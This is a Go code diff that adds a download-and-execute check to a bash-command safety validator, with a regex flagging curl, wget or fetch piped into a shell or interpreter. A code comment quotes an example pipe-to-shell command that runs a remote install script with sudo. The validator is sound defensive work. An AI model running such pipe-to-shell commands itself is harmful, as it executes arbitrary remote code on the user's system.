@@ -61,6 +61,28 @@ func CheckBash(command string) CheckResult {
 		return r
 	}
 
+	// ── 6. Download-and-execute (remote code execution) ──
+	if r := checkPipeToShell(normalized); !r.Safe {
+		return r
+	}
+
+	return CheckResult{Safe: true}
+}
+
+// ── Download-and-execute (pipe-to-shell RCE) ───────────────
+
+// pipeToShellPattern matches a download tool (curl/wget/fetch) whose output is
+// piped into a shell or scripting interpreter. Fetching remote content and
+// executing it directly is arbitrary remote code execution REGARDLESS of host —
+// the prior exfil list only caught it when the URL matched a hardcoded
+// bad-keyword (evil.com/exfil/…), so a benign-looking host
+// ("curl https://get.example.com/install.sh | sudo bash") slipped through.
+var pipeToShellPattern = regexp.MustCompile(`(curl|wget|fetch)\b.*\|\s*(sudo\s+)?(sh|bash|zsh|dash|ksh|fish|csh|tcsh|python3?|perl|ruby|node)\b`)
+
+func checkPipeToShell(cmd string) CheckResult {
+	if pipeToShellPattern.MatchString(cmd) {
+		return CheckResult{Safe: false, Reason: "download-and-execute: piping remote content into a shell/interpreter is remote code execution"}
+	}
 	return CheckResult{Safe: true}
 }
 
